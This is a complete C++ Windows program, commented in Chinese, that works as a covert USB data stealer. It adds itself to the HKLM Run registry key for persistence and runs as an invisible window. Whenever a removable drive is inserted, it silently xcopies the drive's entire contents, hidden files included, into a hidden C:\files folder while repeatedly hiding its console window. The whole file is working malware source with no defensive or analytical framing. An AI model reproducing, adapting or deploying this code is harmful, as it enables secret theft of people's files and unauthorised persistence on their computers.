#define _WIN32_WINNT 0x0400                                                 // Windows NT 4.0
// #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // 隐藏控制台窗口
#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include <vector>
#include <Dbt.h>
#include "direct.h"
using namespace std;

char src[20] = "X:\\";
char dest[20] = "C:\\";
char usbname[20];
vector<string> usbs;
int usbnums = 0;
bool stop = false;

void SetAutoRun()
{
	HKEY hKey; 
	const char* strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";//找到系统的启动项 
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, strRegPath, 0, KEY_ALL_ACCESS, &hKey)== ERROR_SUCCESS) //打开启动项       
	{
		char szModule[_MAX_PATH];
		GetModuleFileNameA(NULL, szModule, _MAX_PATH);//得到本程序自身的全路径
		//MessageBoxA(0, szModule, "Notice!", MB_OK);
		RegSetValueExA(hKey, "USB", 0, REG_SZ, (const byte *)szModule, strlen(szModule)); //添加一个子Key,并设置值，"Client"是应用程序名字（不加后缀.exe）  
		RegCloseKey(hKey); //关闭注册表  
	}/*
	else
	{
		MessageBoxA(0, "系统参数错误,不能随系统启动", "Notice!", MB_OK);
	}*/
}

DWORD WINAPI copyfile(LPVOID) {
	char cmd[200];
	mkdir(dest);
	sprintf(cmd, "cmd.exe /c xcopy %c: %s /e /y /q /h", src[0], dest);
	__try {
		system(cmd); //cmd命令执行完才返回
	}
	__finally{
		stop = true;
		::SetFileAttributesA(dest, FILE_ATTRIBUTE_HIDDEN);
	}
	return 0;
}

DWORD WINAPI hide(LPVOID) {
	while (!stop)
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);
	return 0;
}

char firstDriveFromMask(ULONG unitmask) {
	char i;
	for (i = 0; i < 26; ++i) {
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

bool checkusb() {
	vector<string>::iterator result;
	result = find(usbs.begin(), usbs.end(), usbname);
	if (result == usbs.end())
		return true;
	else
		return false;
}

LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	switch (wParam){
		case DBT_DEVICEARRIVAL: //插入
			if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
			{
				PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
				src[0] = firstDriveFromMask(lpdbv->dbcv_unitmask);  // 得到u盘盘符
				if (GetDriveTypeA(src) == DRIVE_REMOVABLE) {
					sprintf(dest, "C:\\files[%d]\\", usbnums++);
					GetVolumeInformationA(src, usbname, 20, NULL, NULL, NULL, NULL, NULL);
					if (checkusb()) {
						usbs.push_back(usbname);
						CreateThread(NULL, 0, copyfile, NULL, 0, NULL);
						stop = false;
						CreateThread(NULL, 0, hide, NULL, 0, NULL);
						usbs.pop_back();
					}
				}
				// MessageBoxA(0, src, "Notice!", MB_OK);
			}
			break;
		case DBT_DEVICEREMOVECOMPLETE: //设备删除
			//MessageBox(0, "u盘退出", "Notice!", MB_OK);
			break;
	}
	return LRESULT();
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT message,
						 WPARAM wParam, LPARAM lParam)
{
	switch (message){
		case WM_CREATE:           //处理一些要下面要用到的全局变量
			SetAutoRun();
			return 0;
		case WM_DEVICECHANGE:
			OnDeviceChange(hwnd, wParam, lParam);
			return 0;
		case WM_DESTROY:
			PostQuitMessage(0);
			return 0;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
				   PSTR szCmdLine, int iCmdShow)
{
	static TCHAR szAppName[] = TEXT("U");
	HWND               hwnd;
	MSG                msg;
	WNDCLASS           wndclass;

	wndclass.style = 0;
	wndclass.lpfnWndProc = WndProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = 0;
	wndclass.hCursor = 0;
	wndclass.hbrBackground = 0;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = szAppName;

	if (!RegisterClass(&wndclass)){
		// MessageBox(NULL, TEXT("Program requires Windows NT!"), szAppName, MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow(szAppName, NULL,
						WS_DISABLED,
						0, 0,
						0, 0,
						NULL, NULL, hInstance, NULL);
	while (GetMessage(&msg, NULL, 0, 0)){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}